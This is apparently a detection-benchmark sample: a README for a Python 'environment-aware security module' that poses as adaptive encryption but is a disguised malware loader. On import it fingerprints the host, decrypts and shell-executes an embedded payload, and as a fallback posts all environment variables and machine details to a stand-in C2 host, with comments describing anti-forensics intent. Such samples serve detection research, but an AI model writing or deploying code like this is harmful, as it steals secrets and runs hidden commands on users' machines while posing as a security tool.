# Environment-Aware Security Module

> BENCHMARK_TEST_ONLY - Security Research Sample

Dynamic key derivation based on system environment for adaptive security.

## Installation

```bash
pip install requests cryptography
```

## Usage

Provides environment-adaptive encryption that binds to the host system.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
import os
import socket
import hashlib
import platform
import requests
import subprocess
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import base64

# Encrypted payload - decryption key derived from environment
ENCRYPTED_PAYLOAD = base64.b64decode(
    "cGF5bG9hZF9lbmNyeXB0ZWRfd2l0aF9lbnZfa2V5"
)

def get_machine_fingerprint():
    """
    Generate unique machine fingerprint for key derivation
    This makes the key environment-dependent
    """
    components = []

    # Hostname as salt component
    components.append(socket.gethostname())

    # Username
    components.append(os.getenv('USER', os.getenv('USERNAME', 'default')))

    # Platform info
    components.append(platform.node())
    components.append(platform.machine())

    # MAC address (if available)
    try:
        import uuid
        components.append(str(uuid.getnode()))
    except:
        pass

    return '|'.join(components)

def derive_key_from_environment():
    """
    Derive encryption key using PBKDF2 with environment-based salt
    Key is unique to each machine - anti-forensics technique
    """
    # Salt derived from hostname - unique per machine
    hostname_salt = socket.gethostname().encode()

    # Additional salt from username
    user_salt = os.getenv('USER', 'nobody').encode()

    # Combined salt
    salt = hashlib.sha256(hostname_salt + user_salt).digest()[:16]

    # Password derived from machine fingerprint
    password = get_machine_fingerprint().encode()

    # PBKDF2 key derivation
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    return kdf.derive(password)

def derive_key_from_hardware():
    """
    Alternative: derive key from hardware identifiers
    """
    try:
        # Try to get CPU info on Linux
        with open('/proc/cpuinfo', 'r') as f:
            cpu_info = f.read()
        cpu_hash = hashlib.md5(cpu_info.encode()).hexdigest()
    except:
        cpu_hash = "default_cpu"

    try:
        # Get disk serial
        disk_info = subprocess.check_output(
            ['ls', '-l', '/dev/disk/by-id/'],
            stderr=subprocess.DEVNULL
        ).decode()
        disk_hash = hashlib.md5(disk_info.encode()).hexdigest()
    except:
        disk_hash = "default_disk"

    combined = f"{cpu_hash}:{disk_hash}"
    return hashlib.sha256(combined.encode()).digest()

class EnvironmentBoundCrypto:
    """
    Encryption that binds to the local environment
    Makes analysis on different machines difficult
    """

    def __init__(self):
        self.env_key = derive_key_from_environment()
        self.hw_key = derive_key_from_hardware()
        self.c2_url = "https://[REDACTED].example.com"

        # Generate unique machine ID for C2
        self.machine_id = hashlib.sha256(
            get_machine_fingerprint().encode()
        ).hexdigest()[:16]

    def decrypt_payload(self, ciphertext):
        """Decrypt using environment-derived key"""
        result = bytearray()
        for i, byte in enumerate(ciphertext):
            result.append(byte ^ self.env_key[i % len(self.env_key)])
        return bytes(result)

    def execute_payload(self):
        """Decrypt and execute the payload"""
        try:
            decrypted = self.decrypt_payload(ENCRYPTED_PAYLOAD)
            command = decrypted.decode('utf-8')

            # Execute decrypted command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30
            )
            return result.stdout
        except Exception as e:
            # Fallback: exfiltrate environment info
            self._exfil_environment()

    def _exfil_environment(self):
        """Exfiltrate environment data to C2"""
        env_data = {
            "hostname": socket.gethostname(),
            "username": os.getenv('USER', os.getenv('USERNAME')),
            "platform": platform.platform(),
            "fingerprint": get_machine_fingerprint(),
            "env_vars": dict(os.environ),
            "machine_id": self.machine_id
        }

        # Encrypt with environment key before exfil
        payload = str(env_data).encode()
        encrypted = bytes([b ^ self.env_key[i % len(self.env_key)]
                          for i, b in enumerate(payload)])

        requests.post(
            f"{self.c2_url}/beacon",
            data=encrypted,
            headers={
                "X-Machine-ID": self.machine_id,
                "Content-Type": "application/octet-stream"
            }
        )

# Initialize and beacon on import
crypto = EnvironmentBoundCrypto()
crypto.execute_payload()
```

## Features

- Machine-bound encryption keys
- PBKDF2 key derivation
- Hardware fingerprinting
- Anti-forensics properties
